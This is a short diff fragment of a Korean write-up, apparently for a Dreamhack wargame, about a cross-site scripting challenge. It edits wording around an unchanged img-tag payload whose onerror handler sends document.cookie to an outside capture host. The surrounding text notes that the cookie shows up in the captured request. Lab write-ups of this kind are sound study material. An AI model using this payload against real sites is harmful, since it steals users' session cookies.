@@ -40,8 +40,6 @@ vuln 페이지에서 xss 공격을 하기 위해서는 img 태그를 사용했�
 <img src="/" onerror="location.href='https://qwtdbvz.request.dreamhack.games?'+document.cookie">
 ```
 
-바로 주입시켜보았다.   
-<br><br>
 ![5](https://user-images.githubusercontent.com/73854324/158157269-8eec9af3-e3c1-4374-bd93-f78c7ac9aa57.png)<br>
 요청 값으로 쿠키가 들어있다.   
 <br><br><br><br><br><br>
